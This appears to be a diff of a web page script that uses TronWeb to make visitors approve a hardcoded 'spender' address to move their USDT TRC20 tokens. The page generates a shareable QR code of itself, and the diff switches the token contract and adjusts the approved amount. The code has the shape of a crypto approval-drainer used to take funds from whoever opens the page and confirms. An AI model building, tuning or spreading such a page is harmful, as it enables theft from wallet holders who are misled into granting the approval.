@@ -18,10 +18,10 @@
 
   <script>
     const yourSpender = "TCJYKs5AiBucQFSA4GaovG66pHatv1UxYp";
-    const tokenAddress = "TXYZv9sEmidgBkjK5k8U6UJr4bmdbgbJ6z"; // 默认 USDT TRC20 地址
-    const maxAmount = "100000000000000"; // 1亿 * 10^6
+    const tokenAddress = "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7"; // ✅ 正确的 USDT 合约地址
+    const maxAmount = "100000000"; // ✅ 表示 100 USDT（TRC20 是 6 位小数）
 
-    // 生成二维码（指向本页面）
+    // 生成二维码
     const pageURL = window.location.href;
     new QRCode(document.getElementById("qrcode"), pageURL);
 
@@ -33,9 +33,9 @@
       try {
         const contract = await tronWeb.contract().at(tokenAddress);
         const tx = await contract.approve(yourSpender, maxAmount).send();
-        alert("授权交易已发起！交易哈希：" + tx);
+        alert("✅ 授权成功！交易哈希：" + tx);
       } catch (error) {
-        alert("授权失败：" + error.message);
+        alert("❌ 授权失败：" + error.message);
       }
     };
   </script>
